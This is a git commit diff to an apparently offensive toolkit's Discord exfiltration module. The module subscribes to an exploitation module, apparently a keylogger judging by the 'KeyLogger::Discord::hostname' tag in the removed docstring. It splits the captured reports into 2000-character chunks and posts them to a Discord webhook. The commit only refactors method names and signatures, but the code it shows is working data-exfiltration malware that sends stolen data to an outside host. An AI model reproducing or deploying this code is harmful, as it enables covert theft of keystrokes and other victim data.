e2218beb695dfb5101f7d29acd964863e6775d28
EONRaider <livewire_voodoo@protonmail.com>
2021-10-15 11:09:41 -0300

    Rename get_content_bloks method
    The get_content_blocks method was renamed to
    split_message and docstrings were updated
    
    - Modified the update method signature to
    conform to the new interface of the parent class

--- src/modules/exfiltration/discord_server.py
+++ src/modules/exfiltration/discord_server.py
@@ -15,7 +15,6 @@ from src.modules.exfiltration.base import ExfiltrationModule, ExploitationModule
 class Discord(ExfiltrationModule):
     def __init__(self, *,
                  module: ExploitationModule,
-                 tag: str = None,
                  webhook_url: str,
                  char_limit: int = 2000):
         """
@@ -23,11 +22,8 @@ class Discord(ExfiltrationModule):
 
         Args:
             module (ExploitationModule): Instance of ExploitationModule
-                to which the exfiltrator will attach itself as a
-                subscriber.
-            tag (str): A unique identifier for the current host.
-                Defaults to a string with a format similar to
-                'KeyLogger::Discord::hostname' if None.
+                to which the exfiltrator receive data by attaching
+                itself as a subscriber.
             webhook_url (str): URL to the Webhook set up on the Discord
                 server's configuration.
             char_limit (int): Number of characters to be sent per
@@ -35,28 +31,28 @@ class Discord(ExfiltrationModule):
                 and defaults to 2000 characters.
         """
 
-        super().__init__(module, tag)
+        super().__init__(module)
         self.webhook_url = webhook_url
         self.char_limit = char_limit
 
-    def get_content_blocks(self) -> Generator[str, Any, None]:
-        """Yields a generator of strings derived from the report of an
-        ExploitationModule. Each chunk corresponds to a sequence of
-        characters with length smaller than or equal to the character
-        limit imposed by the Discord service."""
-        yield from (self.report[start:start+self.char_limit] for start in
-                    range(0, len(self.report), self.char_limit))
-
-    def update(self) -> None:
+    def update(self, message: str) -> None:
         """Send each report as a new message to a Discord server with a
         Webhook URL enabled."""
         if self.module.has_data is True:
-            asyncio.run(self.send_message())
+            asyncio.run(self.send_message(message))
 
-    async def send_message(self) -> None:
+    def split_message(self, message: str) -> Generator[str, Any, None]:
+        """Yield a generator of strings derived from the report of an
+        ExploitationModule. Each chunk corresponds to a sequence of
+        characters with length smaller than or equal to the character
+        limit imposed by the Discord service."""
+        yield from (message[start:start+self.char_limit] for start in
+                    range(0, len(message), self.char_limit))
+
+    async def send_message(self, message: str) -> None:
         async with aiohttp.ClientSession() as session:
             webhook = Webhook.from_url(url=self.webhook_url,
                                        adapter=AsyncWebhookAdapter(session))
-            for content in self.get_content_blocks():
+            for content in self.split_message(message):
                 await webhook.send(content=content,
                                    username=self.module.__class__.__name__)
